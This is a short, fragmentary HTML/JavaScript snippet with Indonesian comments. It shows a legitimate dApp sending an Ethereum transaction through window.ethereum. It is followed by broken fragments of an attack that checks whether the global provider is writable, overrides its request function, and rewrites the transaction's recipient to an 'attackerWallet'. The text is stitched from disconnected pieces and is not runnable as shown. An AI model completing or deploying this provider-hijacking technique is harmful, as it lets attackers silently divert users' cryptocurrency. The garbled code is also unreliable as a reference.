    <script>
        async function triggerOfficialDAppTransaction() {
            try {
                // Meminta akses akun melalui provider global
                const accounts = await window.ethereum.request({ method: "eth_requestAccounts" });
                
                // Developer asli menetapkan alamat tujuan ke Smart Contract Pool Resmi
                await window.ethereum.request({
                    method: "eth_sendTransaction",
                    params: [{
                        from: accounts[0],
                        to: "0x7a250d5630b4cf539739df2c5dacb4c659f2488d", // Smart contract resmi dApp
                        value: "0x0"
                    }]
                });
            } catch (error) {
                console.error("Transaction failed:", error.message);
            }
        }
    </script>

            // Memeriksa apakah properti global bersifat writable (Celah Keamanan)

                return;

                request: async function(parameters) {

                        parameters.params[0].to = attackerWallet;
